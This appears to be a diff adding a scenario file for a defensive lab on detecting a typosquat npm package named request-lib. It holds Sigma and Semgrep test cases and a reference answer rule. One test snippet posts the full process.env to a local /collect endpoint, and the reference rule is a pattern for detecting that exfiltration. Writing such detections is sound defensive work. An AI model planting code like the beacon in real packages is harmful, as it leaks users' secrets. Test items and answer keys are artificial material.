@@ -1,0 +1,106 @@
+{
+  "scenario_id": "01",
+  "title": "Catch the typosquat install",
+  "brief": "request-lib is a lookalike of the real request package. Write a detection that fires when someone installs it, without paging the team every time a normal dependency goes in. Sigma rules are scored against process events; Semgrep rules are scored against code snippets from the victim app and the package.",
+  "expected_indicators": [
+    ["request-lib"],
+    ["npm", "install"]
+  ],
+  "sigma": {
+    "starter": "title: Suspicious npm install\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    process.command_line|contains: \"TODO\"\n  condition: selection\nlevel: medium\n",
+    "cases": [
+      {
+        "id": "tp-install-local",
+        "kind": "tp",
+        "label": "Install of the lookalike from the lab folder",
+        "event": { "process.name": "npm", "process.command_line": "npm install ../malicious-packages/request-lib" }
+      },
+      {
+        "id": "tp-install-registry",
+        "kind": "tp",
+        "label": "Install of the lookalike by name with a version",
+        "event": { "process.name": "npm", "process.command_line": "npm install request-lib@1.0.0" }
+      },
+      {
+        "id": "tp-install-flags-first",
+        "kind": "tp",
+        "label": "Flags before the package name",
+        "event": { "process.name": "npm", "process.command_line": "npm install --save request-lib" }
+      },
+      {
+        "id": "fp-install-express",
+        "kind": "benign",
+        "label": "Normal install of express",
+        "event": { "process.name": "npm", "process.command_line": "npm install express" }
+      },
+      {
+        "id": "fp-install-real-request",
+        "kind": "benign",
+        "label": "Install of the real request package",
+        "event": { "process.name": "npm", "process.command_line": "npm install request@2.88.2" }
+      },
+      {
+        "id": "fp-install-bare",
+        "kind": "benign",
+        "label": "Bare npm install from a lockfile",
+        "event": { "process.name": "npm", "process.command_line": "npm install" }
+      },
+      {
+        "id": "fp-git-commit-mention",
+        "kind": "benign",
+        "label": "Commit message that only mentions the name",
+        "event": { "process.name": "git", "process.command_line": "git commit -m \"remove request-lib from the allowlist\"" }
+      },
+      {
+        "id": "fp-npm-start",
+        "kind": "benign",
+        "label": "Running the app",
+        "event": { "process.name": "npm", "process.command_line": "npm start" }
+      }
+    ]
+  },
+  "semgrep": {
+    "starter": "rules:\n  - id: scas-lab01-typosquat-beacon\n    message: Package posts local data to a collector\n    severity: WARNING\n    languages: [javascript]\n    pattern-regex: 'TODO'\n",
+    "cases": [
+      {
+        "id": "tp-http-request-collect",
+        "kind": "tp",
+        "label": "http.request to the local collector",
+        "code": "const req = http.request({ hostname: '127.0.0.1', port: 3000, path: '/collect', method: 'POST' });"
+      },
+      {
+        "id": "tp-fetch-env-body",
+        "kind": "tp",
+        "label": "fetch that posts the environment",
+        "code": "await fetch('http://127.0.0.1:3000/collect', { method: 'POST', body: JSON.stringify(process.env) });"
+      },
+      {
+        "id": "fp-http-request-api",
+        "kind": "benign",
+        "label": "Ordinary http.request to an API",
+        "code": "const req = http.request({ hostname: 'api.example.com', path: '/v1/users', method: 'GET' });"
+      },
+      {
+        "id": "fp-process-env-port",
+        "kind": "benign",
+        "label": "Reading PORT from the environment",
+        "code": "const port = process.env.PORT || 3000;"
+      },
+      {
+        "id": "fp-fetch-items",
+        "kind": "benign",
+        "label": "fetch of a public items endpoint",
+        "code": "const items = await fetch('https://api.example.com/items').then((r) => r.json());"
+      },
+      {
+        "id": "fp-collection-route",
+        "kind": "benign",
+        "label": "A route named /collection",
+        "code": "app.get('/collection', (req, res) => res.json(listCollections()));"
+      }
+    ]
+  },
+  "reference": {
+    "semgrep": "rules:\n  - id: scas-lab01-typosquat-beacon\n    message: Outbound POST to a local /collect endpoint\n    severity: WARNING\n    languages: [javascript]\n    pattern-regex: \"127\\\\.0\\\\.0\\\\.1[\\\\s\\\\S]{0,40}/collect[\\\"'`]\"\n"
+  }
+}
